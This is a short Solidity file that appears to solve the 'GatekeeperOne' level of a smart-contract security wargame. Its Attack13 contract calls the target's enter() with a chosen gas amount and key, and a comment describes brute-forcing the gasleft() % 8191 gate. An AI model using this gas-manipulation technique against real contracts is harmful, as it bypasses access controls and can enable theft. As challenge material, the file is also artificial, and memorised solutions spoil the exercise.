// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./13-gatekeeper-1.sol";

contract Attack13 {
    bytes8 public gateKey;
    uint public gasAmount;
    GatekeeperOne public target;

    constructor(address _targetAddress) {
        target = GatekeeperOne(_targetAddress);
    }

    function attack(bytes8 _gateKey, uint _gasAmount) external {
        target.enter{gas: 8191 + _gasAmount}(_gateKey);
    }
}

// Gate Two - pass by ensuring gasleft() is an
// integer multiple of 8191 - brute force attack this one

// modifier gateTwo() {
//     require(gasleft() % 8191 == 0);
//     _;
// }
